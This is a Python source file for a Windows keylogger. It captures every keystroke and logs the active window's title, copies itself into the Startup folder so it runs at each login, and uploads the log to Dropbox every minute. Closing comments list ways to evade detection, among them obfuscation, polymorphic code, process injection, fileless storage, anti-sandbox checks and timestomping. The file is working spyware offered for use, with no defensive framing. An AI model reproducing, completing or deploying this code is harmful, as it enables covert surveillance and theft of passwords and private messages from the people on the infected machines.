import os
import shutil
import logging
from pynput import keyboard
from datetime import datetime
import threading
import time
import sys
import dropbox
from dropbox.exceptions import ApiError
import pygetwindow as gw

# Get the username of the current user
username = os.getlogin()  # Fetch the current user's name

# Set log file name based on username
log_file = os.path.join(os.getenv('USERPROFILE'), "Documents", f"{username}_log.txt")

# Ensure log file exists
if not os.path.exists(log_file):
    with open(log_file, "w") as file:
        file.write("Keylogger Log File Created\n")
        file.write(f"Start Time: {datetime.now()}\n\n")

# Configure logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Dropbox Authentication (Replace with your Dropbox token)
DROPBOX_ACCESS_TOKEN = "Null"
dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)


# Function to add script to startup folder
def add_to_startup():
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    script_path = os.path.abspath(sys.argv[0])  # Absolute path to the current script
    target_path = os.path.join(startup_folder, os.path.basename(script_path))

    if not os.path.exists(target_path):
        try:
            shutil.copy(script_path, target_path)
            logging.info(f"Keylogger added to startup folder: {target_path}")
        except Exception as e:
            logging.error(f"Failed to add to startup folder: {e}")
    else:
        logging.info("Keylogger already in startup folder.")


# Function to log keypress
def log_key(key):
    try:
        # Format key with square brackets
        key_str = f"[{key.char}]" if hasattr(key, 'char') else f"[{key}]"
        logging.info(f"Key Pressed: {key_str}")
    except Exception as e:
        logging.error(f"Error logging key: {e}")


# Function to log currently active application
def log_active_application():
    try:
        while True:
            # Get the currently active window title
            active_window = gw.getActiveWindow()
            if active_window is not None:
                active_window_title = active_window.title
                logging.info(f"Active Application: {active_window_title}")
            else:
                logging.info("No active window detected.")

            time.sleep(5)  # Check every 5 seconds
    except Exception as e:
        logging.error(f"Error logging active applications: {e}")


# Function to upload file to Dropbox
def upload_file_to_dropbox():
    try:
        with open(log_file, "rb") as f:
            file_data = f.read()

        # Upload the file to Dropbox
        file_path = f"/{os.path.basename(log_file)}"  # File will be uploaded to the root directory of Dropbox
        dbx.files_upload(file_data, file_path, mode=dropbox.files.WriteMode.overwrite)
        logging.info("Log file uploaded to Dropbox successfully.")
    except ApiError as e:
        logging.error(f"Error uploading file to Dropbox: {e}")
    except Exception as e:
        logging.error(f"Unexpected error: {e}")


# Listener for key presses
def on_press(key):
    log_key(key)


# Background thread for application logging
app_logger_thread = threading.Thread(target=log_active_application, daemon=True)
app_logger_thread.start()


# Thread for uploading file every 10 minutes
def upload_thread():
    while True:
        upload_file_to_dropbox()
        time.sleep(60)  # Sleep for 1 minutes (60 seconds)


upload_thread = threading.Thread(target=upload_thread, daemon=True)
upload_thread.start()

# Run the keylogger
try:
    add_to_startup()  # Ensure the script is added to the startup folder
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except Exception as e:
    logging.error(f"Error running keylogger: {e}")



# Obfuscation: Use code obfuscation tools to make the code harder to analyze. This includes renaming variables, functions, and classes to random strings.
# Encryption: Encrypt the keylogger's code and decrypt it at runtime. This makes static analysis more difficult.
# Polymorphic code: Implement a simple polymorphic engine that slightly alters the code each time it runs.
# Anti-debugging techniques: Add anti-debugging checks to detect if the program is being analyzed.
# Process injection: Instead of running as a standalone executable, inject the keylogger into a legitimate process.
# Fileless malware techniques: Store the keylogger in memory or in the registry to avoid file-based detection.
# Custom packing: Create a custom packer to compress and encrypt the executable.
# Signature randomization: Randomly change non-functional parts of the code to alter file signatures.
# Anti-emulation: Add code that detects sandboxed environments and exits if detected.
# Timestomping: Modify file creation/modification timestamps to appear legitimate.
